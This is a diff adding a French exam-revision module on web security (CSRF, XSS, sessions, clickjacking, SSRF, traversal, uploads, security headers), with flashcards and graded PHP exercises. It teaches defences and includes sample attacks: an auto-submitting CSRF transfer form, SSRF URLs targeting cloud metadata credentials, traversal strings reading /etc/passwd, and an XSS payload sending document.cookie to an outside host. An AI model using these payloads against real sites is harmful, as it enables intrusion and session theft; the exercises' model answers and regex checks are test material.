@@ -1443,8 +1443,242 @@ prouvee apres coup.`,
 
 /* ============================== 09 ============================== */
 {
-  id: "09-risques",
+  id: "08b-attaques-web",
   num: "09",
+  title: "CSRF, XSS, clic, SSRF & fichiers",
+  tag: "Le reste du programme sécurité",
+  hot: true,
+  intro: "Le sujet demande rarement de réciter un nom d'attaque. Il demande trois choses : qui est attaqué, ce que l'attaquant obtient, et quelle parade côté code. Ces cinq familles couvrent tout ce qui reste après l'injection SQL.",
+  cours: `
+  <h2>1. Le tableau de tri (à savoir refaire de tête)</h2>
+  <pre class="codeblock"><code class="lang-text">Attaque        Qui est attaque      Ce que l'attaquant obtient
+Injection SQL  le SGBD              donnees ou login contourne
+XSS            navigateur victime   vol de session, actions
+CSRF           serveur via victime  action avec ses droits
+SSRF           le serveur           acces au reseau interne
+Traversee/LFI  le serveur           lecture de fichiers
+Clickjacking   le clic victime      action non voulue</code></pre>
+  <p>La question "qui est attaqué ?" suffit à éliminer deux ou trois réponses fausses dans un QCM. Injection SQL et XSS se confondent tout le temps : la première attaque la base, la seconde le navigateur.</p>
+
+  <h2>2. CSRF : Cross-Site Request Forgery</h2>
+  <p><strong>Le mécanisme.</strong> Le navigateur joint <em>automatiquement</em> le cookie de session à toute requête envoyée vers le site, y compris quand la requête part d'une page d'un autre domaine. L'attaquant n'a donc pas besoin de lire la réponse : il lui suffit de <em>déclencher</em> une requête.</p>
+  <pre class="codeblock"><code class="lang-html">&lt;!-- page piegee, hebergee ailleurs --&gt;
+&lt;form action="https://banque.fr/virement" method="post" id="f"&gt;
+  &lt;input type="hidden" name="iban" value="FR76...ATTAQUANT"&gt;
+  &lt;input type="hidden" name="montant" value="2000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</code></pre>
+  <p>La victime est connectée à sa banque dans le même navigateur. Le cookie part tout seul, le virement est exécuté avec <strong>ses</strong> droits. Aucun mot de passe n'a été volé.</p>
+
+  <h3>Les trois parades, dans l'ordre attendu</h3>
+  <ol>
+    <li><strong>Jeton anti-CSRF</strong> (synchronizer token) : généré côté serveur avec <code>random_bytes()</code>, stocké en <code>$_SESSION</code>, inséré en champ caché dans chaque formulaire. À la soumission, on compare avec <code>hash_equals()</code> (comparaison à temps constant, donc pas de fuite par timing). Un site tiers ne peut pas lire le jeton.</li>
+    <li><strong>Cookie <code>SameSite</code></strong> : <code>Lax</code> ou <code>Strict</code> empêche le cookie de partir sur une requête d'origine tierce. C'est une défense en profondeur, <em>jamais la réponse principale</em> : anciens navigateurs, sous-domaines, et <code>Lax</code> laisse passer les <code>GET</code> de navigation.</li>
+    <li><strong>Aucune action qui modifie l'état en <code>GET</code></strong> : <code>/supprimer?id=42</code> appelé par une simple balise <code>img</code> est déjà la faille de conception. Un <code>GET</code> doit être idempotent et sans effet de bord.</li>
+  </ol>
+  <div class="callout callout--warn">
+    <span class="callout__label">Piège classique</span>
+    <p>"J'ai mis <code>SameSite=Strict</code>, donc je suis protégé" ne rapporte pas le point. La réponse attendue reste le <strong>jeton en session comparé côté serveur</strong>. <code>SameSite</code> est un bonus, pas la correction.</p>
+  </div>
+  <p>Ce que CSRF <strong>n'est pas</strong> : ce n'est pas un vol de mot de passe, ce n'est pas du XSS. L'attaquant ne lit rien, il fait agir. Et si le site accepte aussi les requêtes <code>GET</code> pour modifier des données, la faille est plus large encore.</p>
+
+  <h2>3. XSS : Cross-Site Scripting</h2>
+  <pre class="codeblock"><code class="lang-text">Refleche   le payload vient de l'URL, il est renvoye dans la page tout de suite
+Stocke     le payload est enregistre en base, il est servi a TOUS les visiteurs
+DOM        le payload n'est jamais cote serveur, il est manipule par le JS client</code></pre>
+  <p><strong>Impact</strong> : lecture de <code>document.cookie</code> si le cookie n'est pas <code>HttpOnly</code> (donc vol de session), actions dans le navigateur de la victime, redirection, défiguration, keylogging du formulaire de login.</p>
+  <p><strong>Parade</strong> : échapper <em>à l'affichage</em>, pas à l'entrée.</p>
+  <pre class="codeblock"><code class="lang-php">echo htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');</code></pre>
+  <ul>
+    <li><code>ENT_QUOTES</code> échappe aussi les apostrophes : indispensable dans un attribut <code>value='...'</code>.</li>
+    <li><code>'UTF-8'</code> évite les contournements par encodage mal déclaré.</li>
+    <li>Ne pas "nettoyer" à l'entrée avec un filtre maison : on garderait des données dégradées en base et on raterait un autre contexte de sortie (attribut, JSON, JavaScript).</li>
+    <li>Défense en profondeur : en-tête <code>Content-Security-Policy</code>, et cookie <code>HttpOnly</code> pour rendre le vol de session inutile.</li>
+  </ul>
+
+  <h2>4. Session : fixation, vol, expiration</h2>
+  <ul>
+    <li><strong>Fixation</strong> : l'attaquant impose un identifiant de session connu avant le login. Parade : <code>session_regenerate_id(true)</code> juste après authentification.</li>
+    <li><strong>Vol de cookie</strong> : XSS, ou traffic non chiffré. Parades : <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, HTTPS obligatoire.</li>
+    <li><strong>Déconnexion</strong> : <code>$_SESSION = []</code>, <code>session_destroy()</code>, et invalidation du cookie. Vider seulement la variable laisse la session vivante côté serveur.</li>
+  </ul>
+
+  <h2>5. Clickjacking</h2>
+  <p>Le site victime est chargé dans une <code>iframe</code> transparente, superposée à un bouton attractif. La victime croit cliquer sur "Gagner un bon d'achat", elle clique en réalité sur "Supprimer mon compte".</p>
+  <ul>
+    <li><code>X-Frame-Options: DENY</code> (ou <code>SAMEORIGIN</code>) : le site refuse d'être encadré.</li>
+    <li>Équivalent moderne : <code>Content-Security-Policy: frame-ancestors 'none'</code>.</li>
+    <li>Ce n'est pas une faille du code métier : c'est un défaut de configuration HTTP.</li>
+  </ul>
+
+  <h2>6. SSRF : Server-Side Request Forgery</h2>
+  <p>Le site propose une fonction qui va chercher une URL (import d'image, webhook, aperçu de lien). L'attaquant fournit une URL interne :</p>
+  <pre class="codeblock"><code class="lang-text">http://127.0.0.1:8080/admin
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://10.0.0.12:3306</code></pre>
+  <p>Le serveur, lui, est <em>derrière</em> le pare-feu : il peut joindre ce que l'attaquant ne peut pas joindre. <code>169.254.169.254</code> est l'adresse de métadonnées des clouds, elle rend des jetons d'identité. Parade : <strong>liste blanche</strong> de domaines et de schémas autorisés, pas une blacklist d'IP (il y a toujours une notation alternative ou une redirection).</p>
+
+  <h2>7. Traversée de répertoire et inclusion de fichier</h2>
+  <pre class="codeblock"><code class="lang-text">index.php?page=../../../../etc/passwd
+index.php?page=php://filter/convert.base64-encode/resource=config</code></pre>
+  <p>Parade : <code>basename()</code> sur le paramètre, puis <strong>liste blanche</strong> des pages autorisées, et <code>realpath()</code> vérifié comme préfixé par le dossier attendu. Un simple <code>str_replace('../', '')</code> se contourne avec <code>....//</code>.</p>
+
+  <h2>8. Upload de fichier</h2>
+  <ul>
+    <li>Vérifier l'extension <em>et</em> le type réel (<code>finfo</code>), pas seulement l'en-tête <code>Content-Type</code> envoyé par le client.</li>
+    <li>Renommer le fichier côté serveur (identifiant aléatoire), ne jamais réutiliser le nom fourni.</li>
+    <li>Stocker <strong>hors</strong> de la racine web : un <code>.php</code> uploadé dans un dossier servi exécute du code.</li>
+    <li>Retirer le droit d'exécution sur le dossier de dépôt.</li>
+  </ul>
+
+  <h2>9. Les en-têtes de sécurité (5 lignes à retenir)</h2>
+  <pre class="codeblock"><code class="lang-text">Content-Security-Policy      limite les sources de scripts, donc reduit l'impact d'un XSS
+Strict-Transport-Security    le navigateur refuse le HTTP pendant max-age (HSTS)
+X-Content-Type-Options       nosniff : pas d'interpretation devinee du type
+X-Frame-Options              DENY / SAMEORIGIN contre le clickjacking
+Referrer-Policy              limite les fuites d'URL vers les sites tiers</code></pre>
+  <div class="callout callout--key">
+    <span class="callout__label">Formulation qui rapporte</span>
+    <p>"Le pare-feu ne protège pas de cette attaque : la requête est légitime au niveau réseau. La correction est applicative." Cette phrase vaut souvent plus que trois lignes de code.</p>
+  </div>
+
+  <h2>10. Ce qu'on peut te demander</h2>
+  <ul>
+    <li>Lire un formulaire et dire si un jeton anti-CSRF est présent, et où il doit être vérifié.</li>
+    <li>Dire pourquoi <code>/supprimer?id=42</code> en <code>GET</code> est dangereux, même avec une confirmation JavaScript.</li>
+    <li>Corriger un <code>echo $donnees</code> et préciser le contexte d'échappement.</li>
+    <li>Classer un scénario dans la bonne famille d'attaque et nommer une parade.</li>
+    <li>Expliquer pourquoi <code>htmlspecialchars()</code> ne protège pas d'une injection SQL, et l'inverse.</li>
+  </ul>
+  `,
+  cards: [
+    { id: "w1", q: "CSRF : pourquoi l'attaquant n'a-t-il pas besoin de lire la réponse ?", a: "Parce que le navigateur joint <strong>automatiquement</strong> le cookie de session à toute requête vers le site. Il suffit de déclencher l'action : l'effet se produit avec les droits de la victime, sans jamais voir le résultat." },
+    { id: "w2", q: "CSRF ou XSS : lequel vole un mot de passe ?", a: "<strong>Ni l'un ni l'autre directement.</strong> CSRF exploite une session déjà ouverte sans rien voler. XSS peut voler le <em>cookie de session</em> (si non HttpOnly), donc l'accès, mais pas le mot de passe." },
+    { id: "w3", q: "Comment se défend-on d'un CSRF ?", a: "Jeton aléatoire généré côté serveur (<code>random_bytes</code>), stocké en <code>$_SESSION</code>, inséré en champ caché, puis comparé à la soumission avec <code>hash_equals()</code>. En complément : <code>SameSite</code> et jamais d'action en <code>GET</code>." },
+    { id: "w4", q: "Un cookie <code>SameSite=Strict</code> suffit-il contre le CSRF ?", a: "<strong>Non.</strong> C'est une défense en profondeur, pas la correction. Le jeton en session reste la réponse attendue, car <code>SameSite</code> dépend du navigateur et du domaine." },
+    { id: "w5", q: "Pourquoi <code>/supprimer?id=42</code> est-il une faille CSRF ?", a: "Parce qu'un <code>GET</code> qui modifie l'état peut être déclenché par une simple image ou un lien. Un <code>GET</code> doit être idempotent et sans effet de bord ; la suppression doit passer par un <code>POST</code> protégé par jeton." },
+    { id: "w6", q: "XSS stocké contre XSS reflété : quelle différence ?", a: "Stocké : le payload est <strong>enregistré en base</strong> et servi à tous les visiteurs (le plus grave). Reflété : il vient de l'URL et n'affecte que celui qui clique. DOM : il est manipulé uniquement par le JavaScript client." },
+    { id: "w7", q: "Où faut-il échapper contre un XSS ?", a: "<strong>À l'affichage</strong>, avec <code>htmlspecialchars($v, ENT_QUOTES, 'UTF-8')</code>. Pas à l'entrée : on garderait des données dégradées en base et on raterait les autres contextes de sortie (attribut, JSON, JS)." },
+    { id: "w8", q: "À quoi sert <code>HttpOnly</code> ?", a: "Le cookie devient inaccessible à <code>document.cookie</code>. Un XSS ne peut donc plus lire le cookie de session. Ça n'empêche pas l'attaque, ça annule le vol de session." },
+    { id: "w9", q: "Quelle fonction PHP empêche la fixation de session ?", a: "<code>session_regenerate_id(true)</code>, appelée juste après l'authentification réussie. L'identifiant imposé avant le login devient inutilisable." },
+    { id: "w10", q: "Clickjacking : mécanisme et header ?", a: "Le site est chargé dans une iframe transparente superposée à un bouton piégé. Parade : <code>X-Frame-Options: DENY</code> ou <code>Content-Security-Policy: frame-ancestors 'none'</code>." },
+    { id: "w11", q: "Un site importe des images depuis une URL fournie. Quelle attaque et quelle parade ?", a: "<strong>SSRF</strong> : l'attaquant vise <code>127.0.0.1</code>, le réseau interne ou <code>169.254.169.254</code> (métadonnées cloud). Parade : liste blanche de domaines et de schémas, pas une blacklist d'IP." },
+    { id: "w12", q: "Comment sécuriser <code>include $_GET['page']</code> ?", a: "<code>basename()</code> puis <strong>liste blanche</strong> des pages autorisées, et <code>realpath()</code> vérifié comme préfixé par le dossier attendu. Un <code>str_replace('../','')</code> se contourne." },
+    { id: "w13", q: "Trois règles pour un upload de fichier ?", a: "Vérifier l'extension <em>et</em> le type réel avec <code>finfo</code>, renommer côté serveur, stocker hors de la racine web avec exécution PHP désactivée." },
+    { id: "w14", q: "Un clic sur un lien piégé peut-il être bloqué par le pare-feu ?", a: "<strong>Non.</strong> La requête est légitime au niveau réseau. Seule une mesure applicative la bloque : jeton anti-CSRF, échappement, liste blanche. Le pare-feu ne lit pas le contenu." }
+  ],
+  ateliers: [
+    {
+      id: "at-csrf-token",
+      title: "Ajoute le jeton anti-CSRF au formulaire",
+      lang: "php",
+      prompt: `<p>Ce formulaire de virement n'a aucune protection CSRF :</p>
+      <pre class="codeblock"><code class="lang-php">session_start();
+?&gt;
+&lt;form method="post" action="virement.php"&gt;
+  &lt;input type="text" name="montant"&gt;
+  &lt;button type="submit"&gt;Valider&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+      <p>Complète le script : génération du jeton, champ caché dans le formulaire, vérification côté serveur. Utilise <code>random_bytes</code> et <code>hash_equals</code>.</p>`,
+      starter: `session_start();
+
+// 1. Jeton
+
+// 2. Verification si POST
+
+`,
+      model: `session_start();
+
+// 1. Jeton genere une seule fois par session
+if (empty($_SESSION['csrf'])) {
+    $_SESSION['csrf'] = bin2hex(random_bytes(32));
+}
+$jeton = $_SESSION['csrf'];
+
+// 2. Verification si POST, en temps constant
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!isset($_POST['csrf']) || !hash_equals($_SESSION['csrf'], $_POST['csrf'])) {
+        http_response_code(403);
+        exit('Jeton invalide');
+    }
+    // traitement du virement
+}
+?>
+<form method="post" action="virement.php">
+  <input type="hidden" name="csrf" value="<?= htmlspecialchars($jeton, ENT_QUOTES, 'UTF-8') ?>">
+  <input type="text" name="montant">
+  <button type="submit">Valider</button>
+</form>`,
+      checks: [
+        { label: "Jeton aléatoire généré côté serveur", test: /random_bytes\s*\(|bin2hex\s*\(/i },
+        { label: "Jeton stocké en session", test: /\$_SESSION\s*\[\s*['"]csrf['"]\s*\]/ },
+        { label: "Champ caché dans le formulaire", test: /<input[^>]+name\s*=\s*["']?csrf/i },
+        { label: "Comparaison avec hash_equals", test: /hash_equals\s*\(/i },
+        { label: "Rejet de la requête (403 ou exit)", test: /403|http_response_code|exit\s*\(|die\s*\(/i }
+      ]
+    },
+    {
+      id: "at-xss-echap",
+      title: "Corrige l'affichage d'un commentaire",
+      lang: "php",
+      prompt: `<p>Ce code affiche un commentaire saisi par un utilisateur. Un visiteur écrit <code>&lt;script&gt;fetch('https://x.fr?c='+document.cookie)&lt;/script&gt;</code>.</p>
+      <pre class="codeblock"><code class="lang-php">$commentaire = $_POST['commentaire'];
+echo "&lt;p&gt;" . $commentaire . "&lt;/p&gt;";
+echo "&lt;div title=\\"" . $commentaire . "\\"&gt;commentaire&lt;/div&gt;";</code></pre>
+      <p>Réécris l'affichage. Échappe au bon endroit, avec les bons paramètres.</p>`,
+      starter: `$commentaire = $_POST['commentaire'];
+
+`,
+      model: `$commentaire = $_POST['commentaire'];
+
+// Echappement a l'affichage, jamais a l'entree
+$sur = htmlspecialchars($commentaire, ENT_QUOTES, 'UTF-8');
+
+echo '<p>' . $sur . '</p>';
+
+// Dans un attribut, ENT_QUOTES est obligatoire
+echo '<div title="' . $sur . '">commentaire</div>';`,
+      checks: [
+        { label: "htmlspecialchars utilisé", test: /htmlspecialchars\s*\(/i },
+        { label: "ENT_QUOTES présent", test: /ENT_QUOTES/ },
+        { label: "Encodage UTF-8 explicite", test: /UTF-8|UTF8/i },
+        { label: "Plus aucun echo de la variable brute", test: /^(?![\s\S]*echo[^;]*\.\s*\$commentaire\s*\.)/i }
+      ]
+    },
+    {
+      id: "at-attaques-tri",
+      title: "Nomme l'attaque et la parade",
+      lang: "text",
+      prompt: `<p>Pour chaque scénario : le nom de la famille d'attaque, et une parade concrète.</p>
+      <ol>
+        <li>Un lien <code>http://site.fr/admin/supprimer?id=12</code> est envoyé par mail à un administrateur connecté ; la ligne disparaît.</li>
+        <li>Un visiteur poste un commentaire contenant <code>&lt;script&gt;</code> ; tous les lecteurs de la page exécutent le script.</li>
+        <li>Le module d'aperçu d'image accepte <code>http://169.254.169.254/latest/meta-data/</code> et affiche la réponse.</li>
+        <li>Le paramètre <code>?page=../../../../etc/passwd</code> affiche le contenu du fichier.</li>
+        <li>Le site est encadré dans une iframe invisible sur un site tiers ; la victime valide un paiement.</li>
+      </ol>`,
+      starter: `1.
+`,
+      model: `1. CSRF : le GET supprime sans jeton. Parade : POST + jeton en session compare avec hash_equals, jamais d'action en GET.
+2. XSS stocke : le payload est enregistre en base et servi a tous. Parade : htmlspecialchars($v, ENT_QUOTES, 'UTF-8') a l'affichage, cookie HttpOnly, CSP.
+3. SSRF : le serveur joint le reseau interne et les metadonnees cloud. Parade : liste blanche de domaines et de schemas.
+4. Traversee de repertoire / LFI : lecture arbitraire de fichiers. Parade : basename(), liste blanche de pages, realpath verifie.
+5. Clickjacking : clic detourne via iframe. Parade : X-Frame-Options DENY ou CSP frame-ancestors 'none'.`,
+      checks: [
+        { label: "CSRF identifié avec jeton comme parade", test: /csrf[\s\S]{0,300}jeton|jeton[\s\S]{0,300}csrf/i },
+        { label: "XSS identifié avec échappement", test: /xss[\s\S]{0,300}htmlspecialchars|htmlspecialchars[\s\S]{0,300}xss/i },
+        { label: "SSRF identifié avec liste blanche", test: /ssrf/i },
+        { label: "Traversée identifiée (basename / realpath)", test: /travers|basename|realpath|lfi/i },
+        { label: "Clickjacking identifié (X-Frame-Options ou frame-ancestors)", test: /x-frame-options|frame-ancestors|clickjacking/i }
+      ]
+    }
+  ]
+},
+
+/* ============================== 09 ============================== */
+{
+  id: "09-risques",
+  num: "10",
   title: "Analyse de risques",
   tag: "4 sujets sur 9",
   hot: false,
@@ -1578,7 +1812,7 @@ pas au meme evenement redoute.`,
 /* ============================== 10 ============================== */
 {
   id: "10-api",
-  num: "10",
+  num: "11",
   title: "API REST & JSON",
   tag: "Thème montant",
   hot: false,
@@ -1748,7 +1982,7 @@ echo htmlspecialchars($client['nom'], ENT_QUOTES, 'UTF-8');`,
 /* ============================== 11 ============================== */
 {
   id: "11-chiffrement",
-  num: "11",
+  num: "12",
   title: "Chiffrement, hachage & TLS",
   tag: "Ponctuel, en hausse",
   hot: false,
@@ -1841,7 +2075,7 @@ WHERE id = 12;`,
 /* ============================== 12 ============================== */
 {
   id: "12-redaction",
-  num: "12",
+  num: "13",
   title: "Comment rédiger pour marquer les points",
   tag: "Transversal",
   hot: false,
@@ -1928,7 +2162,7 @@ WHERE id = 12;`,
 /* ============================== 13 ============================== */
 {
   id: "13-pieges",
-  num: "13",
+  num: "14",
   title: "Les 12 pièges récurrents",
   tag: "À connaître par cœur",
   hot: true,
@@ -1974,7 +2208,7 @@ WHERE id = 12;`,
 /* ============================== 14 ============================== */
 {
   id: "14-checklist",
-  num: "14",
+  num: "15",
   title: "Checklist J-1",
   tag: "Veille de l'épreuve",
   hot: false,
